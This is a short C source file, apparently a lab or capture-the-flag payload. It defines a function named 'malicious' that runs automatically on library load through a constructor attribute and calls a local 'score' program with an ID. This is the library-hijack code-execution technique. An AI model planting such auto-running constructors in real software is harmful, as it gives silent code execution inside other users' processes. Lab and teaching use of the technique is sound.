#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score cfb4f809-8073-435a-aa3f-b85c2f8a6d0c");
}
